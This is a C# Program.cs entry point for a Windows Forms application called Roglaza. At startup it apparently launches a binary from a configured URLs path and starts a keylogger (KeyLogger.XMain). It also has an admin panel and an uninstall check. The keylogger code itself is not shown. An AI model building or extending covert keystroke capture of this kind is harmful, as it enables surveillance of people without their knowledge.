using Roglaza.Classes;
using Roglaza.Forms;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Data.SQLite;
namespace Roglaza
{
    
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        /// 
        [STAThread]

         public static void Main()
        {
           

            try
            {
                string version = RoglazaHelper.ReadTextFile("version", "1");
                int v = int.Parse(version) + 1;
                RoglazaHelper.FileWriteText("version", v.ToString());
                
            }
            catch { }
            try
            {
                Roglaza.Program.LoadSettings();
                Url__wrapper.RunBinaryExecutable(Program.ProgramSettings.GetUrlsPath());
                KeyLogger.XMain();
            }
            catch(Exception e) { MessageBox.Show(e.Message); }
        }

     
        public  static void Exec()
        {
            //Main Function
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            //If admin turned the app off
            if (RoglazaInstaller.IsAdminUnistalledMe())
            {
                MessageBox.Show(MessageStrings.GetTurned_off_reactivate_message(), MessageStrings.GetTurned_off_reactivate_message_caption);
                try { System.Diagnostics.Process.Start(RoglazaInstaller.GetRoglazaAPPDataPath()); }catch { }               
                return;
            }

            //Detecting test mode
            AppInfo.TestMode = Application.StartupPath.Contains(@"\Roglaza\bin") || RoglazaHelper.IsExistedFile("testmode");
            RoglazaInstaller.InstallDirectories();

            bool Force_creat = RoglazaHelper.IsExistedFile(Application.StartupPath + "\\create");             
            if (ProgramSettings.LoadFromFile()|| Force_creat )
            {
           // try {   DBManager.CreateNewDataBase();   }catch{}
                try
                {
                    var f = new FrmAdminPanel();
                     f.ShowDialog(); }
                catch { }
                ProgramSettings.SaveSettings();
            }

        }
        public static void LoadSettings()
        {
            try
            {
                ProgramSettings = new RoglazaSettings();
                ProgramSettings.LoadFromFile();

            }
            catch { }
      }
        public static RoglazaSettings ProgramSettings = new RoglazaSettings();
        public static System.Drawing.Icon icon ;
        internal static string GetExecutablePath()
        {
            return Application.ExecutablePath.ToString();
        }
        internal static string GetWorkingDirectory()
        {
            return Application.StartupPath.ToString()+"\\";

        }

        public static bool WillExit =false; 
    }



}
